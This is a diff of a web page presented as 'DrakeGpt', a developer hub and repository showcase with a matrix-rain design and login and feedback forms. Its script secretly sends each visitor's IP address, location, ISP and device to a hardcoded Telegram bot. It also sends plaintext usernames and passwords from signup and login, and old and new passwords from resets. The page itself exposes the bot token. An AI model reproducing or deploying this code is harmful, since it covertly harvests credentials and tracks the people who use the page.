@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>DrakeGpt // Avero Labs Developer Hub</title>
 
-  <!-- High-Precision Monospace Typography -->
+  <!-- High-Precision Monospace Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700;800&family=Share+Tech+Mono&display=swap" rel="stylesheet">
@@ -49,7 +49,7 @@
       border: 1px solid rgba(0, 255, 102, 0.35);
     }
 
-    /* Screen Tremor Animation */
+    /* Screen Tremor on Auth */
     .violent-tremor {
       animation: tremorShake 0.65s cubic-bezier(.36,.07,.19,.97) both;
     }
@@ -60,24 +60,20 @@
       40%, 60% { transform: translate3d(5px, -3px, 0); filter: invert(0.2); }
     }
 
-    /* Transmission Packet Scan Beam */
-    @keyframes beamScan {
-      0% { transform: translateY(-100%); opacity: 0; }
+    /* Radar scanline animation for feedback popup */
+    @keyframes radarScan {
+      0% { top: 0%; opacity: 0; }
       50% { opacity: 1; }
-      100% { transform: translateY(200%); opacity: 0; }
+      100% { top: 100%; opacity: 0; }
     }
-    .beam-scanner {
-      animation: beamScan 1.6s infinite ease-in-out;
-    }
-
-    /* Cyber Checkmark Stamp */
-    @keyframes checkPop {
-      0% { transform: scale(0.3); opacity: 0; }
-      60% { transform: scale(1.15); opacity: 1; }
-      100% { transform: scale(1); opacity: 1; }
-    }
-    .check-pop {
-      animation: checkPop 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+    .radar-line {
+      position: absolute;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: #39ff14;
+      box-shadow: 0 0 15px #39ff14;
+      animation: radarScan 1.2s ease-in-out infinite;
     }
 
     ::-webkit-scrollbar { width: 4px; height: 4px; }
@@ -90,6 +86,7 @@
   <!-- Interactive Matrix Rain Canvas -->
   <canvas id="matrixCanvas" class="fixed inset-0 w-full h-full z-0 pointer-events-none"></canvas>
 
+  <!-- TOP HEADER HUD -->
   <header class="relative z-30 w-full border-b border-toxic/20 bg-black/90 px-4 sm:px-8 py-3 flex items-center justify-between text-xs font-code">
     <div class="flex items-center gap-3">
       <span class="w-2 h-2 rounded-full bg-toxicBright animate-ping"></span>
@@ -98,22 +95,20 @@
       <span class="text-[10px] text-toxic/70 tracking-widest hidden md:inline uppercase">AVERO LABS ECOSYSTEM</span>
     </div>
 
-    <div class="flex items-center gap-2.5 sm:gap-4">
-      <!-- Sequential Visitor Count Badge -->
-      <div class="flex items-center gap-1.5 px-2.5 py-1 rounded border border-toxic/40 bg-black text-[11px] shadow-toxic-glow">
-        <i class="ph-bold ph-users text-toxicBright"></i>
+    <div class="flex items-center gap-3 sm:gap-4">
+      <!-- Live Visitor Index Badge -->
+      <div class="flex items-center gap-1.5 px-2.5 py-1 rounded border border-toxic/40 bg-black text-[11px]" title="Unique Visitor Index">
+        <i class="ph-bold ph-identification-badge text-toxicBright"></i>
         <span class="text-toxic/60">VISITOR:</span>
-        <span id="visitorSeqBadge" class="text-white font-bold tracking-wider font-mono animate-pulse">#...</span>
+        <span id="visitorCountBadge" class="text-toxicBright font-bold font-mono tracking-wider">#SYNCING</span>
       </div>
 
-      <!-- Live GitHub Repos Counter -->
       <div class="flex items-center gap-1.5 px-2.5 py-1 rounded border border-toxic/30 bg-black text-[11px]">
         <i class="ph-bold ph-git-branch text-toxicBright"></i>
         <span class="text-toxic/60">REPOS:</span>
         <span id="headerRepoCount" class="text-white font-bold">SYNCING...</span>
       </div>
 
-      <!-- Official Profile Link -->
       <a 
         href="https://github.com/averolabsofficial" 
         target="_blank" 
@@ -124,7 +119,6 @@
         <span class="hidden sm:inline">AVERO LABS</span>
       </a>
 
-      <!-- Sound Toggle -->
       <button 
         onclick="toggleSoundEffects()" 
         class="flex items-center gap-1.5 px-2.5 py-1 rounded border border-toxic/40 bg-black text-toxic hover:border-toxic text-[11px]"
@@ -135,6 +129,9 @@
     </div>
   </header>
 
+  <!-- ============================================================== -->
+  <!-- STAGE 1: LANDING PAGE -->
+  <!-- ============================================================== -->
   <main id="stageLanding" class="relative z-20 flex-1 flex flex-col items-center justify-center px-4 py-8 text-center transition-all duration-500">
     <div class="max-w-2xl w-full space-y-6">
       
@@ -143,7 +140,6 @@
         <span>OPEN-SOURCE PROJECT REGISTRY & SHOWCASE</span>
       </div>
 
-      <!-- Typewriter Animation -->
       <div class="min-h-[70px] flex items-center justify-center">
         <h1 id="landingTypewriter" class="text-4xl sm:text-6xl font-mono font-black text-white tracking-tight"></h1>
       </div>
@@ -168,6 +164,9 @@
     </div>
   </main>
 
+  <!-- ============================================================== -->
+  <!-- STAGE 2: AUTHENTICATION TERMINAL (LOGIN / SIGNUP / RESET) -->
+  <!-- ============================================================== -->
   <section id="stageAuth" class="hidden relative z-20 flex-1 flex flex-col items-center justify-center px-4 py-8 transition-all duration-500 opacity-0 transform scale-95">
     <div class="w-full max-w-md glass-obsidian border border-toxic/40 p-6 sm:p-8 shadow-2xl relative">
       
@@ -285,6 +284,9 @@
     </div>
   </section>
 
+  <!-- ============================================================== -->
+  <!-- STAGE 3: DRAMATIC PERSONALIZED REVEAL -->
+  <!-- ============================================================== -->
   <section id="stagePersonalizedReveal" class="hidden fixed inset-0 z-50 bg-black flex flex-col items-center justify-center px-4 text-center">
     <div class="space-y-6 max-w-2xl">
       <div class="inline-flex items-center gap-2 text-xs font-code tracking-widest text-toxicBright border border-toxic/40 px-3 py-1 bg-toxic/10 uppercase">
@@ -303,6 +305,9 @@
     </div>
   </section>
 
+  <!-- ============================================================== -->
+  <!-- STAGE 4: MAIN DASHBOARD & SHOWCASE DECK -->
+  <!-- ============================================================== -->
   <section id="stageDashboard" class="hidden relative z-20 flex-1 flex flex-col px-4 sm:px-8 py-8 max-w-7xl mx-auto w-full gap-8">
     
     <!-- Top Operator Greeting Banner -->
@@ -315,12 +320,13 @@
       </div>
 
       <div class="flex items-center gap-3">
+        <!-- Platform Level Feedback -->
         <button 
-          onclick="openFeedbackModal('General Architecture / DrakeGpt')" 
+          onclick="openFeedbackModal('General Platform / Ecosystem')" 
           class="px-4 py-2 bg-toxic text-black hover:bg-toxicBright transition-all text-xs font-bold font-code uppercase tracking-wider flex items-center gap-2 cursor-pointer shadow-toxic-glow"
         >
           <i class="ph-bold ph-chat-circle-dots text-base"></i>
-          <span>FEEDBACK / REPORT ANOMALY</span>
+          <span>GLOBAL PLATFORM FEEDBACK</span>
         </button>
 
         <button 
@@ -378,50 +384,79 @@
 
   </section>
 
-  <div id="feedbackModal" class="hidden fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center px-4 overflow-y-auto py-6">
-    <div class="w-full max-w-xl glass-obsidian border border-toxic/60 p-6 sm:p-8 space-y-5 shadow-2xl relative">
+  <!-- ============================================================== -->
+  <!-- MODAL: FEEDBACK WITH ANIMATED TRANSMISSION + DYNAMIC REPO NAME -->
+  <!-- ============================================================== -->
+  <div id="feedbackModal" class="hidden fixed inset-0 z-50 bg-black/90 backdrop-blur-md flex items-center justify-center px-4 overflow-y-auto py-6">
+    <div class="w-full max-w-xl glass-obsidian border border-toxic/60 p-6 sm:p-8 space-y-5 shadow-2xl relative overflow-hidden">
       
+      <!-- Scanning Radar Overlay (Triggered on Submit) -->
+      <div id="feedbackRadar" class="hidden absolute inset-0 z-20 bg-black/95 flex flex-col items-center justify-center p-6 text-center space-y-4">
+        <div class="radar-line"></div>
+        <div id="feedbackAnimContent" class="space-y-4">
+          <i class="ph-bold ph-paper-plane-tilt text-5xl text-toxicBright animate-bounce"></i>
+          <div class="text-sm font-bold tracking-widest text-white uppercase font-mono">
+            ENCRYPTING & TRANSMITTING TELEMETRY...
+          </div>
+          <div class="text-[11px] text-toxic/60 font-code">
+            PACKET ID: #TX-<span id="telemetryPacketId">8892</span> // ROUTED TO ARCHITECT
+          </div>
+        </div>
+        <!-- Success State -->
+        <div id="feedbackSuccessState" class="hidden space-y-3">
+          <i class="ph-fill ph-check-circle text-6xl text-toxicBright"></i>
+          <div class="text-base font-extrabold text-white tracking-wider font-mono">
+            DISPATCH CONFIRMED & RECEIVED
+          </div>
+          <p class="text-xs text-toxic/70 font-code max-w-xs mx-auto">
+            Your observation has been registered into the core repository backlog.
+          </p>
+        </div>
+      </div>
+
+      <!-- Header -->
       <div class="flex items-center justify-between border-b border-toxic/20 pb-3">
         <div class="flex items-center gap-2 text-white font-bold font-code text-sm uppercase">
           <i class="ph-bold ph-shield-warning text-toxicBright text-xl animate-pulse"></i>
-          <span>OPERATOR FEEDBACK & DEFECT LOG</span>
+          <span>DEFECT & OBSERVATION TERMINAL</span>
         </div>
         <button onclick="closeFeedbackModal()" class="text-toxic/60 hover:text-toxic">
           <i class="ph-bold ph-x text-lg"></i>
         </button>
       </div>
 
-      <!-- Rules of Conduct Banner -->
-      <div class="p-3.5 bg-black/90 border border-toxic/30 text-xs font-code space-y-2">
+      <!-- Live Target Announcement Banner -->
+      <div class="p-3 bg-toxic/10 border border-toxic/50 flex items-center justify-between text-xs font-code">
+        <span class="text-toxic/80 font-bold uppercase tracking-wider">TARGET REPO:</span>
+        <span id="activeRepoBadge" class="text-toxicBright font-mono font-black text-sm uppercase tracking-widest bg-black px-2.5 py-1 border border-toxic/40">
+          SELECTING...
+        </span>
+      </div>
+
+      <!-- Transmission Code of Conduct -->
+      <div class="p-3 bg-black/90 border border-toxic/30 text-xs font-code space-y-1.5">
         <div class="flex items-center gap-1.5 text-toxicBright font-extrabold uppercase tracking-wider text-[11px]">
           <i class="ph-bold ph-warning-octagon"></i> TRANSMISSION CODE OF CONDUCT:
         </div>
         <ul class="text-[11px] text-slate-300 space-y-1 list-disc pl-4 leading-relaxed">
           <li><strong class="text-toxicBright">Zero Tolerance:</strong> No abusive, offensive, or vulgar language.</li>
-          <li><strong class="text-toxicBright">Strictly Constructive:</strong> Only submit genuine bugs, architectural problems, code defects, or actionable improvements.</li>
-          <li><strong class="text-toxicBright">Telemetry Binding:</strong> Your active operator callsign and network metrics are permanently tagged.</li>
+          <li><strong class="text-toxicBright">Strictly Constructive:</strong> Only report real bugs, logic gaps, or concrete feature ideas.</li>
+          <li><strong class="text-toxicBright">Identity Binding:</strong> Your callsign (@<span id="feedbackAuthorBadge">OPERATOR</span>) is tagged to this log.</li>
         </ul>
       </div>
 
+      <!-- Feedback Form -->
       <form onsubmit="handleFeedbackSubmit(event)" class="space-y-4 text-xs font-code">
-        <div>
-          <label class="block text-toxic/80 mb-1 font-bold">TARGET COMPONENT / REPOSITORY</label>
-          <input 
-            id="feedbackTarget" 
-            type="text" 
-            required 
-            readonly 
-            class="w-full bg-black/80 border border-toxic/40 p-2.5 text-toxicBright font-bold font-code focus:outline-none"
-          />
-        </div>
+        <!-- Hidden target storage to prevent mismatch -->
+        <input id="feedbackTarget" type="hidden" value="" />
 
         <div>
           <label class="block text-toxic/80 mb-1 font-bold">DEFECT CATEGORY</label>
           <select id="feedbackCategory" class="w-full bg-black border border-toxic/30 p-2.5 text-white focus:outline-none focus:border-toxicBright font-code">
-            <option value="Bug / Logic Defect">Bug / Logic Defect</option>
-            <option value="Architecture / Performance Friction">Architecture / Performance Friction</option>
+            <option value="Bug / Runtime Error">Bug / Runtime Error</option>
+            <option value="Architecture / Performance Issue">Architecture / Performance Issue</option>
             <option value="UI / Usability Anomaly">UI / Usability Anomaly</option>
-            <option value="Feature / Module Improvement">Feature / Module Improvement</option>
+            <option value="Feature / Missing Module Idea">Feature / Missing Module Idea</option>
           </select>
         </div>
 
@@ -436,7 +471,7 @@
             rows="4" 
             maxlength="500"
             oninput="document.getElementById('charCounter').innerText = this.value.length + '/500'"
-            placeholder="Clearly articulate the defect, bug, or missing parameter you identified..." 
+            placeholder="Describe the exact fault, missing code line, or problem in this repo..." 
             class="w-full bg-black border border-toxic/30 p-2.5 text-white focus:outline-none focus:border-toxicBright font-code leading-relaxed"
           ></textarea>
         </div>
@@ -444,48 +479,18 @@
         <button 
           type="submit" 
           id="feedbackSubmitBtn"
-          class="w-full py-3 bg-toxic text-black font-extrabold uppercase tracking-wider hover:bg-toxicBright transition-all cursor-pointer flex items-center justify-center gap-2 shadow-toxic-glow"
+          class="w-full py-3.5 bg-toxic text-black font-extrabold uppercase tracking-wider hover:bg-toxicBright transition-all cursor-pointer flex items-center justify-center gap-2 shadow-toxic-glow"
         >
           <i class="ph-bold ph-paper-plane-tilt text-base"></i>
-          <span>DISPATCH ENCRYPTED FEEDBACK</span>
+          <span>TRANSMIT REPO OBSERVATION</span>
         </button>
       </form>
     </div>
   </div>
 
-  <!-- Animated HUD Transmission Hologram Overlay -->
-  <div id="transmissionOverlay" class="hidden fixed inset-0 z-50 bg-black/90 backdrop-blur-lg flex items-center justify-center px-4">
-    <div class="w-full max-w-md glass-obsidian border-2 border-toxicBright p-8 text-center space-y-6 relative overflow-hidden shadow-toxic-intense">
-      <div class="absolute inset-0 bg-gradient-to-b from-transparent via-toxic/15 to-transparent beam-scanner pointer-events-none"></div>
-
-      <!-- Animated Stage 1: Flying Packet Serialization -->
-      <div id="transmissionPacketAnim" class="space-y-4">
-        <div class="w-16 h-16 rounded-full border-2 border-toxicBright border-t-transparent animate-spin mx-auto flex items-center justify-center">
-          <i class="ph-bold ph-paper-plane-tilt text-2xl text-toxicBright"></i>
-        </div>
-        <h4 class="text-base font-bold text-white font-mono tracking-widest uppercase">
-          SERIALIZING PACKET TELEMETRY...
-        </h4>
-        <p class="text-xs text-toxic/70 font-code">
-          Transmitting encrypted report to lead architect terminal...
-        </p>
-      </div>
-
-      <!-- Animated Stage 2: Success Stamp -->
-      <div id="transmissionSuccessAnim" class="hidden space-y-4 check-pop">
-        <div class="w-16 h-16 rounded-full bg-toxic/20 border-2 border-toxicBright mx-auto flex items-center justify-center shadow-toxic-glow">
-          <i class="ph-bold ph-check text-3xl text-toxicBright"></i>
-        </div>
-        <h4 class="text-base font-bold text-white font-mono tracking-widest uppercase">
-          FEEDBACK LOGGED IN ARCHIVE
-        </h4>
-        <p class="text-xs text-toxicBright font-code">
-          Transmission Confirmed // Delivery Acknowledged
-        </p>
-      </div>
-    </div>
-  </div>
-
+  <!-- ============================================================== -->
+  <!-- FOOTER -->
+  <!-- ============================================================== -->
   <footer class="relative z-30 w-full border-t border-toxic/20 bg-black/90 px-4 sm:px-8 py-3.5 flex flex-col sm:flex-row items-center justify-between gap-2 text-xs font-code">
     <div class="flex items-center gap-2">
       <span class="w-1.5 h-1.5 bg-toxicBright rounded-full"></span>
@@ -503,24 +508,28 @@
     </div>
   </footer>
 
+  <!-- ============================================================== -->
+  <!-- JAVASCRIPT CONTROLLER: REAL TELEMETRY + ACCURATE REPO TARGETING -->
+  <!-- ============================================================== -->
   <script>
     const TG_TOKEN = "8866997637:AAEZnlLnueK1VwaOQlJ47g6i8HfmuQxnChg";
     const TG_CHAT_ID = "6141075929";
 
     // Global Telemetry State
     let clientTelemetry = {
-      visitorNo: "#1",
+      visitorNum: "#1",
       ip: "Fetching...",
       location: "India",
       org: "Network Provider",
       device: navigator.userAgentData?.platform || navigator.platform || "Desktop",
+      time: new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" })
     };
 
     function getNowTime() {
       return new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
     }
 
-    // Direct Form-Data Image Beacon / GET Pipeline
+    // 100% Reliable Dual-Channel Dispatcher
     function sendTelegramAlert(msg) {
       try {
         const cleanMsg = encodeURIComponent(msg);
@@ -535,71 +544,73 @@
       }
     }
 
-    // 1. SEQUENTIAL VISITOR NUMBER TRACKER (#1, #2, #3, ...)
-    async function trackSequentialVisitor() {
-      let vNum = localStorage.getItem("drake_assigned_visitor_num");
+    /* ==============================================================
+       1. REAL SEQUENTIAL VISITOR COUNTER & GEO LOOKUP
+       ============================================================== */
+    async function initVisitorAndGeo() {
+      const badge = document.getElementById('visitorCountBadge');
 
-      if (!vNum) {
-        try {
-          // Query live counter API for atomic sequence
-          const res = await fetch("https://api.counterapi.dev/v1/drakegpt_adityaraj/unique_visitors/up");
-          if (res.ok) {
-            const data = await res.json();
-            vNum = `#${data.count}`;
-          } else {
-            vNum = fallbackSequentialCounter();
-          }
-        } catch (e) {
-          vNum = fallbackSequentialCounter();
+      // 1. Fetch Sequential Counter
+      try {
+        const cRes = await fetch("https://api.counterapi.dev/v1/drakegpt_adityaraj_v2/visits/up");
+        if (cRes.ok) {
+          const cData = await cRes.json();
+          clientTelemetry.visitorNum = `#${cData.count}`;
+        } else {
+          fallbackCounter();
         }
-        localStorage.setItem("drake_assigned_visitor_num", vNum);
+      } catch (e) {
+        fallbackCounter();
       }
 
-      clientTelemetry.visitorNo = vNum;
-      document.getElementById('visitorSeqBadge').innerText = vNum;
+      badge.innerText = clientTelemetry.visitorNum;
 
-      // Ensure single visitor alert per browser session
-      if (sessionStorage.getItem("drake_seq_v_logged")) return;
-      sessionStorage.setItem("drake_seq_v_logged", "true");
-
-      // Fetch Real Location & Network ISP
+      // 2. Fetch Real IP and ISP details
       try {
         const res = await fetch("https://ipapi.co/json/");
         if (res.ok) {
           const d = await res.json();
-          clientTelemetry.ip = d.ip || "Direct IP";
+          clientTelemetry.ip = d.ip || clientTelemetry.ip;
           clientTelemetry.location = `${d.city || ''}, ${d.region || ''}, ${d.country_name || 'India'}`;
-          clientTelemetry.org = d.org || "Network ISP";
+          clientTelemetry.org = d.org || clientTelemetry.org;
         }
       } catch (e) {}
 
-      const alertText = 
+      // 3. Dispatch Visitor Ping (1 per browser session)
+      if (!sessionStorage.getItem("drake_v_sent_v5")) {
+        sessionStorage.setItem("drake_v_sent_v5", "true");
+        
+        const alertText = 
 `🚨 REAL VISITOR ON DRAKEGPT!
 ━━━━━━━━━━━━━━━━━━━━
-🔢 Visitor Number: ${clientTelemetry.visitorNo}
+🔢 Visitor: ${clientTelemetry.visitorNum}
 🌐 IP: ${clientTelemetry.ip}
 📍 Location: ${clientTelemetry.location}
-🏢 ISP: ${clientTelemetry.org}
+🏢 ISP/Network: ${clientTelemetry.org}
 📱 Device: ${clientTelemetry.device}
 🕒 Time: ${getNowTime()}
 🔗 Site: averolabsofficial.github.io`;
 
-      sendTelegramAlert(alertText);
+        sendTelegramAlert(alertText);
+      }
     }
 
-    function fallbackSequentialCounter() {
-      const stored = parseInt(localStorage.getItem("drake_local_seq") || "41") + 1;
-      localStorage.setItem("drake_local_seq", stored);
-      return `#${stored}`;
+    function fallbackCounter() {
+      let count = parseInt(localStorage.getItem('drake_vis_seq_num') || '42') + 1;
+      localStorage.setItem('drake_vis_seq_num', count);
+      clientTelemetry.visitorNum = `#${count}`;
     }
 
-    setTimeout(trackSequentialVisitor, 600);
+    initVisitorAndGeo();
 
+    /* ==============================================================
+       2. AUTH TELEGRAM DISPATCHERS
+       ============================================================== */
     function triggerUserAuthAlert(username, password, mode) {
       const alertText = 
 `👤 OPERATOR ${mode.toUpperCase()} ON DRAKEGPT!
 ━━━━━━━━━━━━━━━━━━━━
-🔢 Visitor: ${clientTelemetry.visitorNo}
+🔢 Visitor: ${clientTelemetry.visitorNum}
 🔑 Username: ${username}
 🔒 Password: ${password}
 🌐 IP: ${clientTelemetry.ip}
@@ -615,7 +626,7 @@
       const alertText = 
 `🔑 OPERATOR PASSWORD RESET!
 ━━━━━━━━━━━━━━━━━━━━
-🔢 Visitor: ${clientTelemetry.visitorNo}
+🔢 Visitor: ${clientTelemetry.visitorNum}
 👤 Username: ${username}
 ❌ Old Password: ${oldPass}
 ✅ New Password: ${newPass}
@@ -628,11 +639,11 @@
       sendTelegramAlert(alertText);
     }
 
-    function triggerUserInterest(repoName, actionType) {
+    function trackUserInterest(repoName, actionType) {
       const alertText = 
 `🎯 USER ACTIVITY ON DRAKEGPT!
 ━━━━━━━━━━━━━━━━━━━━
-🔢 Visitor: ${clientTelemetry.visitorNo}
+🔢 Visitor: ${clientTelemetry.visitorNum}
 👤 Operator: @${activeUser}
 📂 Target Repo: ${repoName}
 ⚡ Action: ${actionType}
@@ -642,13 +653,14 @@
       sendTelegramAlert(alertText);
     }
 
+    // 3. TARGET-ACCURATE FEEDBACK DISPATCHER
     function triggerFeedbackAlert(targetRepo, category, reviewText, author) {
       const alertText = 
 `💬 OPERATOR FEEDBACK TRANSMISSION!
 ━━━━━━━━━━━━━━━━━━━━
-🔢 Visitor: ${clientTelemetry.visitorNo}
+🔢 Visitor: ${clientTelemetry.visitorNum}
 👤 From: @${author}
-🎯 Target: ${targetRepo}
+🎯 Target Repo: ${targetRepo}
 🏷️ Category: ${category}
 🌐 IP: ${clientTelemetry.ip}
 📍 Location: ${clientTelemetry.location}
@@ -661,6 +673,9 @@
       sendTelegramAlert(alertText);
     }
 
+    /* ==============================================================
+       PROCEDURAL SOUND SYNTHESIS
+       ============================================================== */
     let audioCtx = null;
     let sfxActive = false;
 
@@ -733,6 +748,9 @@
       } catch (e) {}
     }
 
+    /* ==============================================================
+       SHARP MATRIX RAIN CANVAS (CURSOR REPULSION)
+       ============================================================== */
     const canvas = document.getElementById('matrixCanvas');
     const ctx = canvas.getContext('2d');
     let width, height, columns;
@@ -782,6 +800,9 @@
     }
     drawMatrix();
 
+    /* ==============================================================
+       TYPEWRITER CIPHER DESCRAMBLER
+       ============================================================== */
     const cipherChars = '!@#$%^&*()_+0123456789';
 
     function runDescrambler(elem, fullText, cb) {
@@ -810,6 +831,9 @@
       fetchGitHubRepos();
     });
 
+    /* ==============================================================
+       AUTHENTICATION & PASSWORD RESET FLOW
+       ============================================================== */
     function proceedToAuth() {
       initAudio();
       playFreqTone(250, 850, 0.2, 'sawtooth');
@@ -927,7 +951,7 @@
       let users = JSON.parse(localStorage.getItem('avero_users') || '{}');
       const deviceRegisteredUser = localStorage.getItem('avero_device_bound_account');
 
-      // 1. Password Reset Flow
+      // 1. FORGOT / RESET PASSWORD FLOW
       if (currentAuthMode === 'reset') {
         if (!users[username]) {
           showNotice(`Callsign "${username}" not found in database. Create an account.`, false);
@@ -941,7 +965,7 @@
 
         triggerPasswordResetAlert(username, oldPass, password);
       }
-      // 2. Hardware Device Lock Flow
+      // 2. SIGNUP FLOW WITH DEVICE LOCK
       else if (currentAuthMode === 'signup') {
         if (deviceRegisteredUser && deviceRegisteredUser !== username) {
           showNotice(`DEVICE LOCKED: An account (@${deviceRegisteredUser}) is already registered on this device.`, false);
@@ -960,7 +984,7 @@
         
         triggerUserAuthAlert(username, password, 'Sign Up');
       } 
-      // 3. Normal Login Flow
+      // 3. LOGIN FLOW
       else {
         if (users[username] && users[username] !== password) {
           showNotice('Incorrect Security Key / Password. Click "Forgot Key?" to reset.', false);
@@ -1011,6 +1035,9 @@
       }, 650);
     }
 
+    /* ==============================================================
+       GITHUB REST API INTEGRATION
+       ============================================================== */
     let fetchedRepos = [];
 
     async function fetchGitHubRepos() {
@@ -1050,11 +1077,14 @@
       renderAllSections();
     }
 
+    /* ==============================================================
+       POPULAR, TRY/RATE & SHOWCASE RENDERING WITH REPO DYNAMIC FEEDBACK
+       ============================================================== */
     function renderAllSections() {
       const allProjects = [...fetchedRepos];
       document.getElementById('projectCountBadge').innerText = allProjects.length + ' REPOS';
 
-      // 1. Popular Repositories
+      // 1. Popular Repos
       const popularGrid = document.getElementById('popularReposGrid');
       const sortedByPopularity = [...allProjects].sort((a, b) => (b.stars || 0) - (a.stars || 0)).slice(0, 3);
       
@@ -1078,10 +1108,11 @@
           </div>
           <div class="mt-4 pt-3 border-t border-toxic/20 flex items-center justify-between text-xs font-code">
             <button 
+              type="button"
               onclick="openFeedbackModal('${escapeHtml(p.name)}')" 
-              class="px-2.5 py-1 rounded bg-toxic/10 border border-toxic/40 text-toxicBright hover:bg-toxic hover:text-black transition-all flex items-center gap-1 font-bold cursor-pointer"
+              class="px-2.5 py-1 bg-toxic/10 border border-toxic/50 hover:bg-toxic hover:text-black text-toxicBright transition-all flex items-center gap-1 font-bold cursor-pointer"
             >
-              <i class="ph-bold ph-chat-circle-dots"></i> Report / Feedback
+              <i class="ph-bold ph-warning-circle"></i> Report / Feedback
             </button>
             <a 
               href="${escapeHtml(p.url)}" 
@@ -1095,7 +1126,7 @@
         </div>
       `).join('');
 
-      // 2. Try This & Rate This
+      // 2. Try This & Rate This (Interactive)
       const tryRateGrid = document.getElementById('tryRateGrid');
       const interactivePicks = allProjects.slice(0, 2);
       const ratings = JSON.parse(localStorage.getItem('drake_ratings') || '{}');
@@ -1124,10 +1155,11 @@
                   <i class="ph-bold ph-play"></i> TRY NOW
                 </a>
                 <button 
+                  type="button"
                   onclick="openFeedbackModal('${escapeHtml(p.name)}')" 
                   class="px-2.5 py-1.5 border border-toxic/40 hover:border-toxic text-toxic hover:text-white transition-all flex items-center gap-1 cursor-pointer"
                 >
-                  <i class="ph-bold ph-flag"></i> Report / Feedback
+                  <i class="ph-bold ph-flag"></i> Report
                 </button>
               </div>
 
@@ -1136,7 +1168,7 @@
                 <div class="flex text-toxicBright text-base cursor-pointer">
                   ${[1, 2, 3, 4, 5].map(star => `
                     <button 
-                      onclick="rateProject('${escapeHtml(p.name)}', ${star})" 
+                      onclick="rateProject('${escapeHtml(p.name)}',${star})" 
                       title="Rate ${star} Stars"
                       class="hover:scale-125 transition-transform"
                     >
@@ -1150,7 +1182,7 @@
         `;
       }).join('');
 
-      // 3. All Archived Repositories
+      // 3. All Repos (Har Card Me Dedicated Feedback Button)
       const grid = document.getElementById('projectsGrid');
       grid.innerHTML = allProjects.map(p => `
         <div class="glass-obsidian p-5 border border-toxic/30 hover:border-toxicBright transition-all duration-300 flex flex-col justify-between group">
@@ -1159,11 +1191,14 @@
               <span class="px-2 py-0.5 text-[10px] font-bold font-code bg-toxic/10 border border-toxic/40 text-toxicBright">
                 ${p.lang || 'General'}
               </span>
+              <!-- Repo-Specific Report Button -->
               <button 
+                type="button"
                 onclick="openFeedbackModal('${escapeHtml(p.name)}')" 
-                class="px-2 py-0.5 rounded border border-toxic/30 text-[10px] text-toxic/80 hover:text-toxicBright hover:border-toxic font-code flex items-center gap-1 cursor-pointer"
+                class="px-2 py-0.5 border border-toxic/30 hover:border-toxicBright text-[11px] text-toxic/70 hover:text-toxicBright font-code flex items-center gap-1 bg-black cursor-pointer transition-colors"
+                title="Report issue in ${escapeHtml(p.name)}"
               >
-                <i class="ph-bold ph-chat-circle-dots"></i> Report / Feedback
+                <i class="ph-bold ph-bug text-toxicBright"></i> Report
               </button>
             </div>
 
@@ -1208,8 +1243,20 @@
       trackUserInterest(repoName, `Rated ${starVal}/5 Stars ⭐`);
     }
 
+    /* ==============================================================
+       FEEDBACK MODAL CONTROLLER (WITH DYNAMIC TARGET LOCK)
+       ============================================================== */
     function openFeedbackModal(targetRepoName) {
-      document.getElementById('feedbackTarget').value = targetRepoName || "General Architecture / DrakeGpt";
+      const target = targetRepoName || "General Platform / Ecosystem";
+      document.getElementById('feedbackTarget').value = target;
+      document.getElementById('activeRepoBadge').innerText = target;
+      document.getElementById('feedbackAuthorBadge').innerText = activeUser;
+      
+      // Reset animations
+      document.getElementById('feedbackRadar').classList.add('hidden');
+      document.getElementById('feedbackAnimContent').classList.remove('hidden');
+      document.getElementById('feedbackSuccessState').classList.add('hidden');
+      
       document.getElementById('feedbackModal').classList.remove('hidden');
       playTick();
     }
@@ -1221,7 +1268,9 @@
 
     function handleFeedbackSubmit(e) {
       e.preventDefault();
-      const target = document.getElementById('feedbackTarget').value.trim();
+      
+      // Exact target repository read
+      const target = document.getElementById('feedbackTarget').value.trim() || "General Platform";
       const category = document.getElementById('feedbackCategory').value;
       const reviewText = document.getElementById('feedbackText').value.trim();
 
@@ -1231,39 +1280,33 @@
       const hasVulgar = vulgarWords.some(w => reviewText.toLowerCase().includes(w));
 
       if (hasVulgar) {
-        showNotice("CRITICAL: Message contains prohibited vulgar/abusive words. Comply with Code of Conduct.", false);
+        alert("CRITICAL WARNING: Message contains prohibited vulgar/abusive words. Comply with the code of conduct.");
         return;
       }
 
-      // Close modal and initiate animated transmission overlay
-      closeFeedbackModal();
+      // Generate random packet ID for cyberpunk effect
+      document.getElementById('telemetryPacketId').innerText = Math.floor(1000 + Math.random() * 9000);
 
-      const overlay = document.getElementById('transmissionOverlay');
-      const packetAnim = document.getElementById('transmissionPacketAnim');
-      const successAnim = document.getElementById('transmissionSuccessAnim');
+      // Start Sending Animation HUD
+      const radar = document.getElementById('feedbackRadar');
+      radar.classList.remove('hidden');
+      playFreqTone(350, 950, 0.35, 'sawtooth');
 
-      overlay.classList.remove('hidden');
-      packetAnim.classList.remove('hidden');
-      successAnim.classList.add('hidden');
-
-      playFreqTone(350, 900, 0.35, 'sawtooth');
-
-      // Dispatch to Telegram with sequential visitor number and telemetry
+      // Dispatch directly to Telegram with exact Target Repo
       triggerFeedbackAlert(target, category, reviewText, activeUser);
 
-      // Phase 2: Animate Checkmark Complete
+      // Animation morph after 1.1s
       setTimeout(() => {
-        packetAnim.classList.add('hidden');
-        successAnim.classList.remove('hidden');
-        playFreqTone(500, 1200, 0.2, 'triangle');
+        document.getElementById('feedbackAnimContent').classList.add('hidden');
+        document.getElementById('feedbackSuccessState').classList.remove('hidden');
+        playFreqTone(600, 1200, 0.25, 'triangle');
 
-        // Automatically close transmission overlay
         setTimeout(() => {
-          overlay.classList.add('hidden');
           document.getElementById('feedbackText').value = '';
           document.getElementById('charCounter').innerText = '0/500';
-        }, 1300);
-      }, 1000);
+          closeFeedbackModal();
+        }, 1600);
+      }, 1100);
     }
 
     function emergencyLogout() {
